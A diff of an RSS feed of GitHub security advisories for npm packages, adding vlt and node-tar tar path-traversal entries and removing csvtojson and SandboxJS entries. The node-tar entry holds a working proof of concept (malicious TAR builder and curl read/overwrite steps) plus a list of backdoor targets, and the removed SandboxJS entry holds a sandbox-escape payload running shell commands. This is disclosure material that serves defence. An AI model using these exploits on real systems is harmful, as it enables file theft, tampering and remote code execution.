@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-01-28T16:19:46.014Z</updated>
+    <updated>2026-01-28T17:00:57.775Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,234 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@vltpkg/tar] vlt Mishandles Path Sanitization for tar]]></title>
+        <id>https://github.com/advisories/GHSA-gf2c-jwcj-x929</id>
+        <link href="https://github.com/advisories/GHSA-gf2c-jwcj-x929"/>
+        <updated>2026-01-28T16:48:37.000Z</updated>
+        <content type="html"><![CDATA[<p>vlt before 1.0.0-rc.10 mishandles path sanitization for tar, leading to path traversal during extraction.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24909">https://nvd.nist.gov/vuln/detail/CVE-2026-24909</a></li>
+<li><a href="https://github.com/vltpkg/vltpkg/pull/1334">https://github.com/vltpkg/vltpkg/pull/1334</a></li>
+<li><a href="https://github.com/vltpkg/vltpkg/releases/tag/v1.0.0-rc.10">https://github.com/vltpkg/vltpkg/releases/tag/v1.0.0-rc.10</a></li>
+<li><a href="https://www.koi.ai/blog/packagegate-6-zero-days-in-js-package-managers-but-npm-wont-act">https://www.koi.ai/blog/packagegate-6-zero-days-in-js-package-managers-but-npm-wont-act</a></li>
+<li><a href="https://www.scworld.com/news/six-javascript-zero-day-bugs-lead-to-fears-of-supply-chain-attack">https://www.scworld.com/news/six-javascript-zero-day-bugs-lead-to-fears-of-supply-chain-attack</a></li>
+<li><a href="https://github.com/vltpkg/vltpkg/commit/ff8d4099a1929772cea2adf131285e90ede6b0dd">https://github.com/vltpkg/vltpkg/commit/ff8d4099a1929772cea2adf131285e90ede6b0dd</a></li>
+<li><a href="https://github.com/advisories/GHSA-gf2c-jwcj-x929">https://github.com/advisories/GHSA-gf2c-jwcj-x929</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gf2c-jwcj-x929</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-01-28T00:31:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[tar] node-tar Vulnerable to Arbitrary File Creation/Overwrite via Hardlink Path Traversal]]></title>
+        <id>https://github.com/advisories/GHSA-34x7-hfp2-rc4v</id>
+        <link href="https://github.com/advisories/GHSA-34x7-hfp2-rc4v"/>
+        <updated>2026-01-28T16:35:31.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>node-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability exists in <code>lib/unpack.js</code>. When extracting a hardlink, two functions handle the linkpath differently:</p>
+<p><strong>Security check in <code>[STRIPABSOLUTEPATH]</code>:</strong></p>
+<pre><code class="language-javascript">const entryDir = path.posix.dirname(entry.path);
+const resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));
+if (resolved.startsWith('../')) { /* block */ }
+</code></pre>
+<p><strong>Hardlink creation in <code>[HARDLINK]</code>:</strong></p>
+<pre><code class="language-javascript">const linkpath = path.resolve(this.cwd, entry.linkpath);
+fs.linkSync(linkpath, dest);
+</code></pre>
+<p><strong>Example:</strong> An application extracts a TAR using <code>tar.extract({ cwd: '/var/app/uploads/' })</code>. The TAR contains entry <code>a/b/c/d/x</code> as a hardlink to <code>../../../../etc/passwd</code>.</p>
+<ul>
+<li><p><strong>Security check</strong> resolves the linkpath relative to the entry's parent directory: <code>a/b/c/d/ + ../../../../etc/passwd</code> = <code>etc/passwd</code>. No <code>../</code> prefix, so it <strong>passes</strong>.</p>
+</li>
+<li><p><strong>Hardlink creation</strong> resolves the linkpath relative to the extraction directory (<code>this.cwd</code>): <code>/var/app/uploads/ + ../../../../etc/passwd</code> = <code>/etc/passwd</code>. This <strong>escapes</strong> to the system's <code>/etc/passwd</code>.</p>
+</li>
+</ul>
+<p>The security check and hardlink creation use different starting points (entry directory <code>a/b/c/d/</code> vs extraction directory <code>/var/app/uploads/</code>), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.</p>
+<h3 id="poc">PoC</h3>
+<h4 id="setup">Setup</h4>
+<p>Create a new directory with these files:</p>
+<pre><code>poc/
+├── package.json
+├── secret.txt          ← sensitive file (target)
+├── server.js           ← vulnerable server
+├── create-malicious-tar.js
+├── verify.js
+└── uploads/            ← created automatically by server.js
+    └── (extracted files go here)
+</code></pre>
+<p><strong>package.json</strong></p>
+<pre><code class="language-json">{ "dependencies": { "tar": "^7.5.0" } }
+</code></pre>
+<p><strong>secret.txt</strong> (sensitive file outside uploads/)</p>
+<pre><code>DATABASE_PASSWORD=supersecret123
+</code></pre>
+<p><strong>server.js</strong> (vulnerable file upload server)</p>
+<pre><code class="language-javascript">const http = require('http');
+const fs = require('fs');
+const path = require('path');
+const tar = require('tar');
+
+const PORT = 3000;
+const UPLOAD_DIR = path.join(__dirname, 'uploads');
+fs.mkdirSync(UPLOAD_DIR, { recursive: true });
+
+http.createServer((req, res) =&gt; {
+  if (req.method === 'POST' &amp;&amp; req.url === '/upload') {
+    const chunks = [];
+    req.on('data', c =&gt; chunks.push(c));
+    req.on('end', async () =&gt; {
+      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));
+      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });
+      res.end('Extracted\n');
+    });
+  } else if (req.method === 'GET' &amp;&amp; req.url === '/read') {
+    // Simulates app serving extracted files (e.g., file download, static assets)
+    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');
+    if (fs.existsSync(targetPath)) {
+      res.end(fs.readFileSync(targetPath));
+    } else {
+      res.end('File not found\n');
+    }
+  } else if (req.method === 'POST' &amp;&amp; req.url === '/write') {
+    // Simulates app writing to extracted file (e.g., config update, log append)
+    const chunks = [];
+    req.on('data', c =&gt; chunks.push(c));
+    req.on('end', () =&gt; {
+      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');
+      if (fs.existsSync(targetPath)) {
+        fs.writeFileSync(targetPath, Buffer.concat(chunks));
+        res.end('Written\n');
+      } else {
+        res.end('File not found\n');
+      }
+    });
+  } else {
+    res.end('POST /upload, GET /read, or POST /write\n');
+  }
+}).listen(PORT, () =&gt; console.log(`http://localhost:${PORT}`));
+</code></pre>
+<p><strong>create-malicious-tar.js</strong> (attacker creates exploit TAR)</p>
+<pre><code class="language-javascript">const fs = require('fs');
+
+function tarHeader(name, type, linkpath = '', size = 0) {
+  const b = Buffer.alloc(512, 0);
+  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);
+  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);
+  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);
+  b.write('        ', 148);
+  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;
+  if (linkpath) b.write(linkpath, 157);
+  b.write('ustar\x00', 257); b.write('00', 263);
+  let sum = 0; for (let i = 0; i &lt; 512; i++) sum += b[i];
+  b.write(sum.toString(8).padStart(6, '0') + '\x00 ', 148);
+  return b;
+}
+
+// Hardlink escapes to parent directory's secret.txt
+fs.writeFileSync('malicious.tar', Buffer.concat([
+  tarHeader('d/', 'dir'),
+  tarHeader('d/x', 'link', '../secret.txt'),
+  Buffer.alloc(1024)
+]));
+console.log('Created malicious.tar');
+</code></pre>
+<h4 id="run">Run</h4>
+<pre><code class="language-bash"># Setup
+npm install
+echo "DATABASE_PASSWORD=supersecret123" &gt; secret.txt
+
+# Terminal 1: Start server
+node server.js
+
+# Terminal 2: Execute attack
+node create-malicious-tar.js
+curl -X POST --data-binary @malicious.tar http://localhost:3000/upload
+
+# READ ATTACK: Steal secret.txt content via the hardlink
+curl http://localhost:3000/read
+# Returns: DATABASE_PASSWORD=supersecret123
+
+# WRITE ATTACK: Overwrite secret.txt through the hardlink
+curl -X POST -d "PWNED" http://localhost:3000/write
+
+# Confirm secret.txt was modified
+cat secret.txt
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>An attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:</p>
+<p><strong>Immediate (Read Attack):</strong> If the application serves extracted files, attacker can read any file readable by the process.</p>
+<p><strong>Conditional (Write Attack):</strong> If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.</p>
+<h3 id="remote-code-execution--server-takeover">Remote Code Execution / Server Takeover</h3>
+<table>
+<thead>
+<tr>
+<th>Attack Vector</th>
+<th>Target File</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SSH Access</td>
+<td><code>~/.ssh/authorized_keys</code></td>
+<td>Direct shell access to server</td>
+</tr>
+<tr>
+<td>Cron Backdoor</td>
+<td><code>/etc/cron.d/*</code>, <code>~/.crontab</code></td>
+<td>Persistent code execution</td>
+</tr>
+<tr>
+<td>Shell RC Files</td>
+<td><code>~/.bashrc</code>, <code>~/.profile</code></td>
+<td>Code execution on user login</td>
+</tr>
+<tr>
+<td>Web App Backdoor</td>
+<td>Application <code>.js</code>, <code>.php</code>, <code>.py</code> files</td>
+<td>Immediate RCE via web requests</td>
+</tr>
+<tr>
+<td>Systemd Services</td>
+<td><code>/etc/systemd/system/*.service</code></td>
+<td>Code execution on service restart</td>
+</tr>
+<tr>
+<td>User Creation</td>
+<td><code>/etc/passwd</code> (if running as root)</td>
+<td>Add new privileged user</td>
+</tr>
+</tbody></table>
+<h2 id="data-exfiltration--corruption">Data Exfiltration &amp; Corruption</h2>
+<ol>
+<li><strong>Overwrite arbitrary files</strong> via hardlink escape + subsequent write operations</li>
+<li><strong>Read sensitive files</strong> by creating hardlinks that point outside extraction directory</li>
+<li><strong>Corrupt databases</strong> and application state</li>
+<li><strong>Steal credentials</strong> from config files, <code>.env</code>, secrets</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/isaacs/node-tar/security/advisories/GHSA-34x7-hfp2-rc4v">https://github.com/isaacs/node-tar/security/advisories/GHSA-34x7-hfp2-rc4v</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24842">https://nvd.nist.gov/vuln/detail/CVE-2026-24842</a></li>
+<li><a href="https://github.com/isaacs/node-tar/commit/f4a7aa9bc3d717c987fdf1480ff7a64e87ffdb46">https://github.com/isaacs/node-tar/commit/f4a7aa9bc3d717c987fdf1480ff7a64e87ffdb46</a></li>
+<li><a href="https://github.com/advisories/GHSA-34x7-hfp2-rc4v">https://github.com/advisories/GHSA-34x7-hfp2-rc4v</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-34x7-hfp2-rc4v</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-01-28T16:35:31.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[pnpm] pnpm: Binary ZIP extraction allows arbitrary file write via path traversal (Zip Slip)]]></title>
         <id>https://github.com/advisories/GHSA-6pfh-p556-v868</id>
@@ -668,86 +896,5 @@ The endpoint <code>/dashboard/content-management/edit?edit={UUID}</code> validat
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-01-27T22:13:52.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[csvtojson] CSVTOJSON has a prototype pollution vulnerability]]></title>
-        <id>https://github.com/advisories/GHSA-vrw9-g62v-7fmf</id>
-        <link href="https://github.com/advisories/GHSA-vrw9-g62v-7fmf"/>
-        <updated>2026-01-27T21:06:05.000Z</updated>
-        <content type="html"><![CDATA[<p>The csvtojson package, a tool for converting CSV data to JSON with customizable parsing capabilities, contains a prototype pollution vulnerability in versions prior to 2.0.10. This issue arises due to insufficient sanitization of nested header names during the parsing process in the parser_jsonarray component. When processing CSV input containing specially crafted header fields that reference prototype chains (e.g., using <strong>proto</strong> syntax), the application may unintentionally modify properties of the base Object prototype. This vulnerability can lead to denial of service conditions or unexpected behavior in applications relying on unmodified prototype chains, particularly when untrusted CSV data is processed. The flaw does not require user interaction beyond providing a maliciously constructed CSV file.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57350">https://nvd.nist.gov/vuln/detail/CVE-2025-57350</a></li>
-<li><a href="https://github.com/Keyang/node-csvtojson/issues/498">https://github.com/Keyang/node-csvtojson/issues/498</a></li>
-<li><a href="https://github.com/VulnSageAgent/PoCs/tree/main/JavaScript/prototype-pollution/CVE-2025-57350">https://github.com/VulnSageAgent/PoCs/tree/main/JavaScript/prototype-pollution/CVE-2025-57350</a></li>
-<li><a href="https://github.com/Keyang/node-csvtojson/issues/502">https://github.com/Keyang/node-csvtojson/issues/502</a></li>
-<li><a href="https://github.com/Keyang/node-csvtojson/commit/4caeebd13b67be63282a7bbed3ca0cf9813f4bfc">https://github.com/Keyang/node-csvtojson/commit/4caeebd13b67be63282a7bbed3ca0cf9813f4bfc</a></li>
-<li><a href="https://security.snyk.io/vuln/SNYK-JS-CSVTOJSON-13109616">https://security.snyk.io/vuln/SNYK-JS-CSVTOJSON-13109616</a></li>
-<li><a href="https://github.com/advisories/GHSA-vrw9-g62v-7fmf">https://github.com/advisories/GHSA-vrw9-g62v-7fmf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vrw9-g62v-7fmf</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-09-24T18:30:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@nyariv/sandboxjs] SandboxJS has Sandbox Escape via Unprotected AsyncFunction Constructor]]></title>
-        <id>https://github.com/advisories/GHSA-wxhw-j4hc-fmq6</id>
-        <link href="https://github.com/advisories/GHSA-wxhw-j4hc-fmq6"/>
-        <updated>2026-01-27T19:55:12.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A sandbox escape vulnerability due to <code>AsyncFunction</code> not being isolated in <code>SandboxFunction</code></p>
-<h3 id="details">Details</h3>
-<p>The library attempts to sandbox code execution by replacing the global <code>Function</code> constructor with a safe, sandboxed version (<code>SandboxFunction</code>). This is handled in <code>utils.ts</code> by mapping <code>Function</code> to <code>sandboxFunction</code> within a map used for lookups.</p>
-<p>However, the library did not include mappings for <code>AsyncFunction</code>, <code>GeneratorFunction</code>, and <code>AsyncGeneratorFunction</code>. These constructors are not global properties but can be accessed via the <code>.constructor</code> property of an instance (e.g., <code>(async () =&gt; {}).constructor</code>).</p>
-<p>In <code>executor.ts</code>, property access is handled. When code running inside the sandbox accesses <code>.constructor</code> on an async function (which the sandbox allows creating), the <code>executor</code> retrieves the property value. Since <code>AsyncFunction</code> was not in the safe-replacement map, the <code>executor</code> returns the actual native host <code>AsyncFunction</code> constructor.</p>
-<p>Constructors for functions in JavaScript (like <code>Function</code>, <code>AsyncFunction</code>) create functions that execute in the global scope. By obtaining the host <code>AsyncFunction</code> constructor, an attacker can create a new async function that executes entirely outside the sandbox context, bypassing all restrictions and gaining full access to the host environment (Remote Code Execution).</p>
-<h3 id="poc">PoC</h3>
-<pre><code class="language-js">const sandbox = require('@nyariv/sandboxjs');
-const s = new sandbox.default();
-
-const payload = `
-    const af = async () =&gt; {};
-    // .constructor returns the host AsyncFunction constructor because it's not intercepted
-    const AsyncConstructor = af.constructor;
-    console.log("AsyncConstructor name:", AsyncConstructor.name);
-    
-    // Create a function that executes outside the sandbox
-    const func = AsyncConstructor("return process.mainModule.require('child_process').execSync('id').toString()");
-    
-    // Execute RCE
-    const p = func();
-    p.then(proc =&gt; {
-        console.log(proc);
-    });
-`;
-
-try {
-    s.compile(payload)().run();
-} catch (e) {
-    console.error("Bypass failed:", e.message);
-}
-</code></pre>
-<p>Run above script in nodejs. If you run it in browser, change the <code>AsyncConstructor</code> argument by returning <code>window</code> object. </p>
-<h3 id="impact">Impact</h3>
-<p>A Remote Code Execution, attacker may be able to run an arbitrary code.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nyariv/SandboxJS/security/advisories/GHSA-wxhw-j4hc-fmq6">https://github.com/nyariv/SandboxJS/security/advisories/GHSA-wxhw-j4hc-fmq6</a></li>
-<li><a href="https://github.com/nyariv/SandboxJS/commit/345aee6566e47979dee5c337b925b141e7f78ccd">https://github.com/nyariv/SandboxJS/commit/345aee6566e47979dee5c337b925b141e7f78ccd</a></li>
-<li><a href="https://github.com/advisories/GHSA-wxhw-j4hc-fmq6">https://github.com/advisories/GHSA-wxhw-j4hc-fmq6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wxhw-j4hc-fmq6</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-01-27T19:55:11.000Z</published>
     </entry>
 </feed>
